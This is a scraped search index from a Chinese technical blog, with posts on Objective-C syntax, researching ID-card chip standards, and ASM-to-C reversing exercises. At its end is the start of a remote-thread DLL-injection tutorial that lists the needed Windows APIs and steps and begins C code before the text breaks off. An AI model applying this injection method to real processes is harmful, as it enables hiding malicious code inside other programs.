","date":"2021-12-01","objectID":"/zh-cn/1-1/:3:1","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"实现 遵循C语言的规范，类实现一般定义在对应的.m文件中。类实现包含了公开方法的实现， 以及定义私有（private） 变量及方法。 以关键字@implementation作为区块起头，@end结尾。 上述类的一个实现如下： @implementation MyClass { NSString *secret; -(id) initWithString: (NSString*)aName { self.name = aName; return 0; } +(MyClass)createMyClassWithString:(NSString*)aName { MyClass * my = [[MyClass alloc] init]; my.name = aName; return my; } } 头文件（类声明）中定义的属性默认为protected，方法为public。而类实现中定义的属性为private。 当然也可以使用@public、@private等助记符来覆盖默认行为。 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:3:2","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"实例化 实例化即创建对象。Objective-C创建对象需通过alloc以及init两个消息。alloc的作用是分配内存， init则是初始化对象。 init与alloc都是定义在NSObject里的方法，父对象收到这两个信息并做出正确回应后， 新对象才创建完毕。如上述类中： MyClass * my = [[MyClass alloc] init]; 在Objective-C 2.0里，若创建对象不需要参数，则可直接使用new： MyClass * my = [MyClass new]; 仅仅是语法上的精简，效果完全相同。 若要自己定义初始化的过程，可以重写init方法，来添加额外的工作。（用途类似C++ 的构造函数constructor）， 如下： - (id) init { if ( self=[super init] ) { // 必须调用父类的init // do something here ... } return self; } ","date":"2021-12-01","objectID":"/zh-cn/1-1/:3:3","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"方法(method) 在上节介绍类的时候已经见过了一些方法的定义和使用，第一次接触Objective-C的人肯定会觉得很奇怪（比如我就觉得这语法比Golang还奇葩）， 但是只要接收了这种设定，还是可以慢慢习惯的。 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:4:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"声明 下图为Objective-C内置数组类型的insertObject方法声明： 方法实际的名字(insertObject:atIndex:)是所有方法标识关键的级联，包含了冒号。冒号表明了参数的出现。 如果方法没有参数，你可以省略第一个(也是唯一的)方法标识关键字后面的冒号。本例中，这个方法有两个参数。 该函数转换成类似的C++表示如下： void insertObject:atIndex:(id anObject, NSUInteger index); ","date":"2021-12-01","objectID":"/zh-cn/1-1/:4:1","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"调用 调用一个方法实际上就是传递消息到对应的对象。这里消息就是方法标识符以及传递给方法的参数信息。 发送给对象的所有消息都会动态分发，这样有利于实现Objective-C类的多态行为。 也就是说，如果子类定义了跟父类的具有相同标识符的方法，那么子类首先收到消息， 然后可以有选择的把消息转发（也可以不转发）给他的父类。 消息被中括号( [ 和 ] )包括。括号中接收消息的对象在左边，消息及其参数在右边。 例如，给myArray变量传递消息insertObject:atIndex:消息，可以使用如下的语法： [myArray insertObject:anObj atIndex:0]; 消息允许嵌套。也就是说，假如你有一个myAppObject对象，该对象有getArray方法获取数组， 有getObjectToInsert方法获取元素，那么嵌套的消息可以写成： [[myAppObject getArray] insertObject:[myAppObject getObjectToInsert] atIndex:0]; ","date":"2021-12-01","objectID":"/zh-cn/1-1/:4:2","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"属性(attribute) 属性没什么好说的，和C++的类属性类似。不过在Objective-C 2.0引入了新的语法以声明变量为属性， 并包含一可选定义以配置访问方法的生成。属性总是为公共的，其目的为提供外部类访问（也可能为只读） 类的内部变量的方法。属性可以被声明为“readonly”，即只读的，也可以提供储存方法包括“assign”， “copy”或“retain”（简单的赋值、复制或增加1引用计数）。默认的属性是原子的， 即在访问时会加锁以避免多线程同时访问同一对象，也可以将属性声明为“nonatomic”（非原子的）， 避免产生锁。 定义属性的例子如下： @interface Person : NSObject { @public NSString *name; @private int age; } @property(copy) NSString *name; @property(readonly) int age; -(id)initWithAge:(int)age; @end ","date":"2021-12-01","objectID":"/zh-cn/1-1/:5:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"synthesize 属性的访问方法由@synthesize关键字来实现，它由属性的声明自动的产生一对访问方法。 另外，也可以选择使用@dynamic关键字表明访问方法为手动提供。 @implementation Person @synthesize name; @dynamic age; -(id)initWithAge:(int)initAge { age = initAge; // 注意：直接赋给成员变量，而非属性 return self; } -(int)age { return 18; // 注意：并非返回真正的年龄 } @end ","date":"2021-12-01","objectID":"/zh-cn/1-1/:5:1","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"访问 属性可以利用传统的消息表达式、点表达式或\"valueForKey:\"/“setValue:forKey:“方法对来访问。如下： Person *aPerson = [[Person alloc] initWithAge: 53]; // 修改属性 aPerson.name = @\"Steve\"; [aPerson setName: @\"Steve\"]; // 读取属性 NSString *tmp; tmp = [aPerson name]; // 消息表达式 tmp = aPerson.name; // 点表达式 tmp = aPerson-\u003ename; // 直接访问成员变量 tmp = [aPerson valueForKey:@\"name\"]; // property访问 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:5:2","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"协议(Protocol) 协议是一组没有实现的方法列表，任何的类均可采纳协议并具体实现这组方法。简而言之就是接口， 可以类比Java的interface，或者C++的纯虚函数，表述一种is-a的概念。 协议以关键字@protocol作为区块起始，@end结束，中间为方法列表。如下： @protocol Mutex - (void)lock; - (void)unlock; @end 若要声明实现该协议，可以使用尖括号\u003c\u003e，如下： @interface SomeClass : SomeSuperClass \u003cMutex\u003e @end 一旦SomeClass表明他采纳了Mutex协议，SomeClass就有义务实现Mutex协议中的两个方法： @implementation SomeClass - (void)lock { // 实现lock方法 } - (void)unlock { // 实现unlock方法 } @end ","date":"2021-12-01","objectID":"/zh-cn/1-1/:6:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"动态类型 类似于Smalltalk，Objective-C具备动态类型：即消息可以发送给任何对象实体，无论该对象实体的公开接口中有没有对应的方法。 虽然Objective-C具备动态类型的能力， 但编译期的静态类型检查依旧可以应用到变量上。 以下三种声明在运行时效力是完全相同的， 但是三种声明提供了一个比一个更明显的类型信息， 附加的类型信息让编译器在编译时可以检查变量类型，并对类型不符的变量提出警告。 下面三个方法，差异仅在于参数的形态： - setMyValue1:(id) foo; - setMyValue2:(id \u003caProtocol\u003e) foo; - setMyValue3:(NSNumber*) foo; Objective-C中的id类型类似于void指针，但是被严格限制只能使用在对象上。 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:7:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"消息转发 一个对象收到消息之后，他有三种处理消息的可能手段，第一是回应该消息并运行方法，若无法回应， 则可以转发消息给其他对象，若以上两者均无，就要处理无法回应而抛出的例外。只要进行三者之其一， 该消息就算完成任务而被丢弃。若对\"nil”（空对象指针）发送消息，该消息通常会被忽略， 只不过对于某些编译器选项可能会抛出异常。 Objective-C运行时在Object中定义了一对方法： 转发方法： - (retval_t) forward:(SEL) sel :(arglist_t) args; // with GCC - (id) forward:(SEL) sel :(marg_list) args; // with NeXT/Apple systems 响应方法： - (retval_t) performv:(SEL) sel :(arglist_t) args; // with GCC - (id) performv:(SEL) sel :(marg_list) args; // with NeXT/Apple systems GCC和NeXT/Apple编译器的区别是返回值和参数类型不同。 希望实现转发的对象只需用新的方法覆盖以上方法来定义其转发行为而无需重写响应方法performv::， 因为后者只是单纯的对响应对象发送消息并传递参数。其中，SEL类型是Objective-C中消息的类型。 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:8:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"类别(Category) Objective-C借用并扩展了Smalltalk实现中的\"分类\"概念，用以帮助达到分解代码的目的。 一个分类可以将方法的实现分解进一系列分离的文件。程序员可以将一组相关的方法放进一个分类， 使程序更具可读性。举例来讲，可以在字符串类中增加一个名为\"拼写检查\"的分类， 并将拼写检查的相关代码放进这个分类中。 分类中的方法是在运行时被加入类中的，这一特性允许程序员向现存的类中增加方法， 而无需持有原有的代码， 或是重新编译原有的类。 例如若系统提供的字符串类的实现中不包含拼写检查的功能，可以增加这样的功能而无需更改原有的字符串类的代码。 在运行时，分类中的方法与类原有的方法并无区别，其代码可以访问包括私有类成员变量在内的所有成员变量。 若分类声明了与类中原有方法同名的函数，则分类中的方法会被调用。因此分类不仅可以增加类的方法， 也可以代替原有的方法。这个特性可以用于修正原有代码中的错误，更可以从根本上改变程序中原有类的行为。 若两个分类中的方法同名，则被调用的方法是不可预测的。 分类的声明如下： @interface ClassName (CategoryName) @end 下面是一个具体的例子，通过MyAdditions分类，动态的给NSString类中添加getCopyRightString方法： #import \u003cFoundation/Foundation.h\u003e @interface NSString(MyAdditions) +(NSString *)getCopyRightString; @end @implementation NSString(MyAdditions) +(NSString *)getCopyRightString { return @\"Copyright evilpan.com 2019\"; } @end int main(int argc, const char * argv[]) { NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init]; NSString *copyrightString = [NSString getCopyRightString]; NSLog(@\"Accessing Category: %@\", copyrightString); [pool drain]; return 0; } 小结 现在，我们已经了解了Objective-C语言的基本语法和关键概念，可以开始自己编写简单的程序了。 一门语言只是一个工具，常用常新，如果不使用，学得再深也很容易遗忘。 当然，本文介绍的Objective-C特性只是一小部分，但我们仍然可以先用起来， 等遇到具体语法或者API时候再查阅文档（如spec、tutorialspoint等）即可。 使用得越多，需要查阅文档但频率也会越少，学习没有捷径可言。 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:9:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":[],"content":"2020-05-31 约 4156 字 预计阅读 9 分钟 1220 次阅读 目录 本文主要记录一下对身份证加密芯片和SAM密码模块的相关资料搜索过程，并(尽量)总结归纳一下搜索中的一些经验和心得。 注：本人未曾参与过身份证相关研发工作，文中内容全部来自于互联网公开信息 前言 每当我因为办事需要用到身份证时，就会看着卡片上自己英俊的照片陷入沉思：这张小小的身份证是如何证明我的身份的？经过简单的查询可以知道身份证里面有一张芯片，通过一些密码学的黑魔法可以读取和校验个人信息，仅此而已。这对于喜欢刨根问底的人而言显然不是一个满意的回答，因此在一个无聊的周末，我决定尝试认真研究一下，看看自己能挖得多深。在解决这单个无聊问题的同时，也让我对网络信息查询有了一点新的体会，不愿藏拙一并分享给大家。 Round1：模糊查询 要说搜索信息，我们第一个想到的肯定是百度，毕竟这是“最懂中国人的搜索引擎”。但事实上搜索技术发展到现在，各个搜索引擎的索引结果其实都大同小异，甚至一些国外的搜索引擎对于中文也有了比较高质量的搜索结果，比如Google、Bing、Yandex等等，而对于英文信息的搜索，无疑也是国际化的搜索引擎更胜一筹。 因为我们搜索的是中国的二代身份证芯片信息，所以还是选择中文搜索引擎，首先在百度中搜索关键字身份证芯片： baidu 说实话，信息比我想象的要多。其实第一次搜索的目的主要是筛选关键字，并根据关键字进行下一步的精细搜索，通过百度上的内容我们可以得知的信息有： 二代身份证中使用的是非接触式IC卡 IC卡中包含加密模块，存有个人信息 IC芯片的疑似部分制造商信息 需要有专门的解密模块才能读取和写入个人信息 通过深度优先算法逐一查看这些搜索结果，并没有太多的额外内容，但是得知了解密模块的昵称为SAM模块，全称猜测是Security Authentication Module之类。在一些电子论坛中可以看到有相关行业人员的一些讨论，SAM模块由公安部提供，分为两种型号： 0501：只能解码身份证文字和头像图片信息 0503：除了0501能读的信息，还包括指纹信息 说到具体有哪些信息，搜索中也遇到了一些语焉不详故作神秘的回答： sec 不能回答不要浪费我流量，OK？ 总而言之，第一步的目的已经基本达到，我们获取了一些关键词：加密芯片、SAM模块等等，接下来就需要用这些关键词去进行下一步的搜索。值得一提的是，大部分问题是否能找到想要的回答，更多是取决于你是否Ask The Right Question，即是否问到了点上，模糊查询的目的就是找出这些点。 Round2：精确搜索 通过身份证SAM模块和加密芯片的关键字，我进行了第二轮的搜索，这次找到了一些其他内容： sam 已经从小白式的问答逐渐转入了圈子内(开发者)的问答，这是个问对问题的好迹象。同样阅读这些搜索结果，我们得知身份证读卡模块有很多厂商在生产和销售，点进其中一个厂商的网站查看对应产品的信息，可以看到读卡模块长这样： mz 根据我粗浅的电路知识可以知道的是，右边为IC读卡线圈，将读取的IC芯片信息传输到左边的板子中进行解密，解密后的信息通过USB再读取到电脑或者其他设备中进行存储和进一步验证。 左边的电路板似乎就是我们要找的SAM模块，但仔细一想，功能单一的密码模块不可能这么庞大，所以这只是集成了密码模块的的一个完整系统，SAM模块只是其中的一部分(视力好的同学可以看看是哪个部分)。 在论坛和厂商的文档中，我们至少可以知道身份证芯片中所包含的内容包括姓名、民族、出生年月、照片等卡片上本来就有的信息，以及指纹信息。其中指纹信息解密后并不是常规的bitmap，而是特殊的特征信息，指纹特征比对算法是由公安部认证的算法提供商所提供的。 Round3：去伪存真 上面这些信息，其实更多的是一些“道听途说”的内容，出于严谨的考虑，还是希望能找到出处。因此，这一步的搜索就需要进一步限定范围。其实如果是公开信息，那么这些信息一般都会在国家标准中找到出处，现在假设我还不知道这点，就先用传统搜索方法，在公开论文中查找。 论文一般是别人花费心思的研究成果，因此查找论文的好处是可以尽可能保证信息的准确性，并在此基础上通过论文中的引用文献进一步确定我们需要寻找的方向。另外通过阅读高质量的论文对于我们快速了解一个领域也是很有帮助的，一个小技巧是在论文搜索中使用关键字+综述(英文论文则是关键字+survey)的查找方式，通过几篇论文就能大概知道特定领域的过去、现在以及未来发展。 回到身份证的问题上，搜索到的相关论文有： 《第二代居民身份证集成电路设计关键技术研究》—— 公安部第一研究所 《第二代居民身份证阅读器原理与应用》—— 公安部第一研究所证件部 《RFID技术在身份证系统中的应用》—— 公安部第一研究所 《身份证件的安全要求和可使用的密码学技术》—— 中科院信息工程研究所信息安全国家重点实验室 《身份证阅读器的研究与设计》—— 武汉理工大学 …… 阅读理解后可以知道二代身份证系统主要分为两个部分，一个是制卡发证系统，另外一个是社会应用系统，前者主要由公安部直接进行管理和协调，后者则在一定程度上开放给各个厂商。制卡发证系统主要是将用户信息通过公安部私钥进行加密并写入身份证芯片中，写入后无法修改(ROM或者写入后烧断熔丝)。社会应用就是上面提到的身份证阅读器生态，主要是使用公安部预置公钥的安全密码模块对身份证芯片中读取的信息进行解密和校验。 身份证信息的读取在物理层上和其他IC卡(银行卡、公交卡、饭卡)类似，都是通过读卡器发送射频信号触发IC卡的电路从而进行数据交互，因此不多展开，重点是其中特有的安全认证过程。在上述论文的引用文献中，发现了一个官方的标准文档——GA 467—2013 : ga 该标准由公安部一所、公安部居民身份证秘钥管理中心和数据通信科学技术研究所联合起草，定义了身份证安全控制模块接口、信号时序、传输协议以及操作命令。其中定义的安全模块名称为SAM_A(Secure Access Module for Authentication)，即验证安全控制模块，从而订正了我们前面对SAM的错误缩写。值得一提的是，在该标准的前一版(2004版)中，安全模块的缩写为SAM_V，这也是很多厂商惯用的叫法。 SAM模块的内部实现是非公开的，因此我们就从接口本身去看。SAM模块的一方面通过射频模块接口与身份证IC卡通信，另一方面通过串口UART或者USB接口与业务终端进行通信。业务终端传输到SAM模块的命令分为两个部分，分别是命令码(CMD)**和**命令参数(Para)，各为1字节，一共有10个命令码，如下表所示： cmd SAM模块返回给业务终端的响应使用状态字(SW)表示，一共有3个状态字和一个帧数据内容(Data)段，分别表示返回结果以及返回的数据内容。 面向身份证IC卡的射频部分同样指定了读写协议，值得重点提一下的是SAM模块对于和身份证IC卡的交互中定义了精确的时序范围。为什么说这个呢？因为曾经出现过的一种方案就是使用手机作为读卡器，并将读取的IC卡裸数据转发到云端的SAM模块去解密，这样可以少买一点SAM模块。……不过这种方案对于网络延时是相当敏感的，根据标准中的定义很可能导致操作超时。 因此我想要了解的信息就基本满足了，在查找资料的过程中，通过对这些国标的交叉查阅，发现了另外关于身份证各个方面的详细定义，包括证件的UI布局、证件号码的格式与校验，还顺便找到了上面那个故作神秘的知乎回答(身份证芯片中保存的是什么信息)的真正答案： id 出自《GA448—2013 居民身份证总体技术要求》 更进一步，我还顺便找到了身份证芯片中每个字段的内容含义以及存储空间大小： 数据项 字节数 备注 姓名 30 性别代码 2 GB/T 2261.1 民族代码 2 GB/T 3304 出生日期 16 格式为YYYYMMDD 住址 70 公民身份证号码 36 GB 11643 签发机关 30 有效期起始日期 16 GA/T 2000.16 有效期截止日期 16 同上 reserve 36 预留区 相片信息 1024 以二进制存储的WLT格式文件 指纹1 512 第一枚指纹特征数据 指纹2 512 第二枚指纹特征数据 追加住址1 70 追加住址2 70 追加住址3 70 追加住址4 70 电路序号 8 证卡序号 16 出自《GA490—2019 居民身份证机读信息规范》 总结 一开始对身份证芯片的疑惑现在已经基本得到满足，只剩下目前暂未公开的身份证芯片和SAM模块的内部实现。这部分有机会的话会进行进一步的逆向和研究，比如读取SAM芯片的固件进行分析，不过这就是不可说的部分了。 身份证的“秘密”本身并不是太过需要关注的重点，重点是挖掘秘密的过程。现代互联网中信息繁多且良莠不齐，再加上各种内容农场疯狂霸占搜索引擎的首页，如何在其中找到真正需要的信息其实对网民也是一种挑战。信息搜索说难不难，说简单也不简单，关键是要在正确的地方问到正确的问题。问问题的学问很多其他文章已经有介绍过了，问出正确的问题是需要有一定先验积累的，如果无法理解问题，又怎么能理解回答呢？ 另外在正确的地方提问也十分重要，比如编程问题上stackoverflow，了解专业领域到专门的论文平台搜索等，国内的有知网、百度学术，国外的论文可以上arxiv.org找。而对于某些工业、设计上的问题，比如本文提及的身份证芯片，一般会有专门的标准文档进行介绍。 各类标准按照不同的行业和领域有自己的前缀，比如GB、GA、GM等等，分散在不同的标准网站中，其中政府的官方网站做了一个比较完整的聚合，可以","date":"2021-12-01","objectID":"/zh-cn/1/:0:0","tags":[],"title":"从身份证芯片的“秘密”谈谈网络信息搜索","uri":"/zh-cn/1/"},{"categories":["ASM","C"],"content":"此文为加密收费内容添加我微信支付后可看: 从ASM练习中编写C（while/循环） 在这个挑战中，我将使用英特尔和AT\u0026T语法查看程序（while/loop）的ASM指令。在尽我所能弄清楚每个指令的作用后，我将编写一个C程序，以反映我认为ASM指令中正在发生的事情。这些挑战纯粹是为了实践，将帮助您了解逆向工程以及C和ASM的基础知识。 ","date":"2021-11-30","objectID":"/zh-cn/31-3/:0:0","tags":["ASM","C"],"title":"从ASM练习中编写C（while/循环）","uri":"/zh-cn/31-3/"},{"categories":["ASM","C"],"content":"挑战 下面您将看到C程序（while/循环）的ASM说明，挑战是在查看下面的ASM说明后编写C程序。左侧是英特尔语法，右侧是AT\u0026T语法。 注：我建议学习英特尔和AT\u0026T语法，如下所示 slider = new juxtapose.JXSlider('#foo', [ { src: 'https://s3.amazonaws.com/malicious.beta/wp-content/uploads/2021/03/29194128/carbon-23.png', label: '2021', credit: 'Mr·Yang' }, { src: 'https://s3.amazonaws.com/malicious.beta/wp-content/uploads/2021/03/29194134/carbon-22.png', label: '2021', credit: \"Mr·Yang\" } ], { animate: false, showLabels: true, showCredits: true, startingPosition: \"50%\", makeResponsive: false }); 注：请注意上述英特尔和AT\u0026T语法之间的区别。通过这个较小的程序，你可以开始看到两者之间的区别（即mov与movl等…） ","date":"2021-11-30","objectID":"/zh-cn/31-3/:1:0","tags":["ASM","C"],"title":"从ASM练习中编写C（while/循环）","uri":"/zh-cn/31-3/"},{"categories":["ASM","C"],"content":"笔记 这些是我检查上述代码时记的一些笔记，从第9行（值标签）开始。 在上述说明中，我可以看到第9-11行似乎是名称值的全局变量，并在4字节数据类型中设置了小数点后10，如下所示。 下一组引起我注意的说明是第26-27行的说明，其中0的值被传递到指针位置进行存储，然后下一个指令无条件跳转到标记L2。这通常意味着*DWORD PTR -4[rbp]*的值将是某种计数器，或用于跟踪迭代的占位符，我们可以在以后的步骤中证明或反驳这些迭代，但边走边记住这些想法是件好事。 无条件跳转到标签L2有以下说明。 第36-42行似乎将全局变量的值（小数点后10）移动到EAX寄存器，然后下一个指令是将我们的DWORD PTR-4[rbp]迭代占位符与EAX中存储的值进行比较。如果存储在EAX中的值小于全局变量中存储的值（小数点后10），下一个指令是跳转。如果值不小于全局变量，则主函数清理EAX寄存器，然后离开并返回到以前的堆栈帧。因此，这意味着如果值小于全局变量，则应跳转到标签L3以发生更多逻辑，否则程序将成功结束。因此，让我们看看标签L3的逻辑，看看这如何适合程序的其余部分。 因此，按照L3之前的逻辑，我们似乎有一个位于DWORD PTR值[rip]的全局静态值，小数为10。我们还在DWORD PTR -4[rbp]上还有一个值，该值似乎持有一个临时数字，最终与上面列出的全局静态值进行比较。 我们在上面的第29行可以看到，1的值正在添加到DWORD PTR-4[rbp]的值中，然后在将同一值移动到EAX寄存器后立即添加。第31-34行的以下4行正在通过从标签LC0[rip]添加格式字符串来设置printf函数，然后将格式字符串（DWORD PTR-4[rbp]）的一部分参数移动到ESI寄存器中。接下来，根据printf函数的x64 ABI，0将移入EAX寄存器。 因此，尽管如此，还是在谈论这些话中，这个项目实际上做了什么？ ","date":"2021-11-30","objectID":"/zh-cn/31-3/:2:0","tags":["ASM","C"],"title":"从ASM练习中编写C（while/循环）","uri":"/zh-cn/31-3/"},{"categories":["ASM","C"],"content":"解决方案 在解析了上述代码中的每个指令后，我编写了以下C程序来重建ASM指令。 接下来是编译代码，看看它是否有效，然后在二进制文件上运行objdump，看看我们的拆卸离我们开始的指令有多近。 太棒了！它没有出错，所以让我们用objdump仔细检查我们的准确性，如下所示。 结果很好，因为我可以看到说明与上面的原始ASM说明非常相似，但没有标签。您可以看到有一个cmp指令，然后是jmp指令，该指令在代码中向后跳，添加1，就像在本帖顶部的ASM指令中所做的那样。当您在野外看到这样的模式时，或者在反向工程时，您应该开始注意它可能是一个循环，在这个特定的例子中，它是一个正在使用的while循环。 我希望你学到了一些你以前不知道的新东西。 ","date":"2021-11-30","objectID":"/zh-cn/31-3/:3:0","tags":["ASM","C"],"title":"从ASM练习中编写C（while/循环）","uri":"/zh-cn/31-3/"},{"categories":["ASM","C"],"content":"此文为加密收费内容添加我微信支付后可看: ASM实践中的写作C（如果/然后） 在这个挑战中，我将使用英特尔和AT\u0026T语法查看64位ELF可执行文件（如果/然后）的ASM指令。在尽我所能弄清楚每个指令的作用后，我将编写一个C程序，以反映我认为ASM指令中正在发生的事情。这些挑战纯粹是为了实践，将帮助您了解逆向工程以及C和ASM的基础知识。 ","date":"2021-11-30","objectID":"/zh-cn/31-2/:0:0","tags":["ASM","C"],"title":"ASM实践中的写作C（如果/然后）","uri":"/zh-cn/31-2/"},{"categories":["ASM","C"],"content":"挑战 下面您将看到C程序的ASM说明（如果/然后），挑战是在查看下面的ASM说明后编写C程序。左侧是英特尔语法，右侧是AT\u0026T语法。 注：我建议同时学习英特尔和AT\u0026T语法，如下所示 注：请注意上述英特尔和AT\u0026T语法之间的区别。通过这个较小的程序，你可以开始看到两者之间的区别（即mov与movl等...） ","date":"2021-11-30","objectID":"/zh-cn/31-2/:1:0","tags":["ASM","C"],"title":"ASM实践中的写作C（如果/然后）","uri":"/zh-cn/31-2/"},{"categories":["ASM","C"],"content":"笔记 这些是我检查上述代码时记下的一些笔记，从第14行（主）开始。 在上述说明中，我可以看到主值（10，20）内有2个值设置为固定值。每个值的大小看起来是4个字节，由于我可以看到正在设置的值，我知道这2个值既是整数，也不是指针。 您还可以在上述说明中看到，对printf的调用使用PLT（程序链接表），该表在使用函数名称后由@PLT后缀表示。对printf的调用在64位编程ABI中设置如下（如第31-34行和第40-43行所示）。 如帖子顶部的ASM说明所示，LC0和LC1标签列在主标签之前，其值如下所示，以供参考。 根据提供给printf的参数，ASM指令可能会使用更多的寄存器进行整数/指针或作为参数传递的浮点/双值。 ","date":"2021-11-30","objectID":"/zh-cn/31-2/:2:0","tags":["ASM","C"],"title":"ASM实践中的写作C（如果/然后）","uri":"/zh-cn/31-2/"},{"categories":["ASM","C"],"content":"解决方案 在解析了上述代码中主指令后，我编写了以下C程序来重建ASM指令。 接下来是编译代码，看看它是否有效，然后在二进制文件上运行objdump，看看我们的拆卸离我们开始的指令有多近。 太棒了！它没有出错，所以让我们用objdump再次检查我们的准确性，如下所示。 如您所见，这些说明与我们一开始的情况并不相同，但您可以看到它们离我们很近……我会称之为成功，我希望你也学到了很多。 ","date":"2021-11-30","objectID":"/zh-cn/31-2/:3:0","tags":["ASM","C"],"title":"ASM实践中的写作C（如果/然后）","uri":"/zh-cn/31-2/"},{"categories":["DLL注入","远线程注入"],"content":"此文为加密收费内容添加我微信支付后可看: 技术分享 | DLL注入之远线程注入 ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:0","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","远线程注入"],"content":"0x00 远线程注入 远线程注入是指一个进程在另一个进程中创建线程的技术。 ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:1","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","远线程注入"],"content":"0x01 函数介绍 OpenProcess 作用： 打开现有的本地进程对象。 函数声明： HANDLE WINAPI OpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ) 参数： dwDesiredAccess： 想拥有该进程的访问权限，若进程启动了SeDebugPrivilege权限，则无论安全描述符内容是什么，都会授予请求的访问权限。 bInheritHandle： 若该值为TRUE，则此进程创建的进程将继承该句柄。 dwProcessId： 本地进程的PID。 返回值： 成功：返回进程打开句柄 失败：返回NULL VirtualAllocEx 作用： 在指定进程的虚拟地址空间内保留、提交或更改内存的状态。 函数声明： LPVOID WINAPI VirtualAllocEx( _In_ HANDLE hProcess, _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect ) 参数： hProcess: 过程的句柄。句柄必须有PROCESS_VM_OPERATION（允许远程VM操作）权限。 lpAddress： 指定要分配页面所需起始地址指针。若为NULL，则自动分配内存。 dwSize： 要分配的内存大小，单位为字节。 flAllocationType： 内存分配类型。具体参数参考官方手册。 flProtect： 要分配的页面区域的内存保护。 返回值： 成功：返回分配页面基址 失败：返回NULL WriteProcessMemory 作用： 在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。 函数声明： BOOL WINAPI WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_ LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_ SIZE_T *lpNumberOfBytesWritten ) 参数： hProcess: 要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。 lpBaseAddress： 指向指定进程中写入数据的基地址指针。 lpBuffer： 指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。 nSize： 要写入指定进程的字节数。 lpNumberOfBytesWritten： 指向变量的指针，该变量接收传输到指定进程的字节数。 返回值： 成功：返回不为0 失败：返回0 CreateRemoteThread 作用： 在另一个进程的虚拟地址空间中创建运行的线程。 函数声明： HANDLE WINAPI CreateRemoteThread（ _In_ HANDLE hProcess, _In_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_ LPDWORD lpThreadId ） 参数： hProcess: 要创建线程的进程句柄。句柄必须具有PROCESS_CREATE_THREAD、RPOCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。 lpThreadAttributes: 指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定进程是否可以继承返回的句柄。若为NULL，则线程获取默认的安全描述符，不能继承该句柄。 dwStackSize: 堆栈的初始大小，以字节为单位。 lpStartAddress： 指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。 lpParameter： 指向要传递给线程函数的变量的指针。 dwCreationFlags： 控制线程创建的标志。若为0，表示线程在创建后立即运行。 lpThreadId： 指向接收线程标识符的变量的指针。为NULL则不返回线程标识符。 返回值： 成功：返回新线程的句柄 失败：返回NULL ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:2","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","远线程注入"],"content":"0x02 实现过程 1、获取LoadLibrary函数的地址，对于kernel32.dll的加载基址在每个进程中都是相同的，所以我们能获取LoadLibrary函数的地址。 2、调用VirtualAllocEx函数向目标进程空间申请一块内存。 3、调用WriteProcessMemory函数将指定的DLL路径写入到目标进程空间。 4、通过CreateRemoteThread函数加载LoadLibrary函数的地址，进行DLL注入。 ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:3","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","远线程注入"],"content":"0x03 实例代码 #include \u003cWindows.h\u003e #include \u003cstdio.h\u003e BOOL CreateRemoteThreadInjectDll(DWORD dwProcessId, wchar_t *pszDllFileName) { HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; // 打开注入的进程 hProcess = 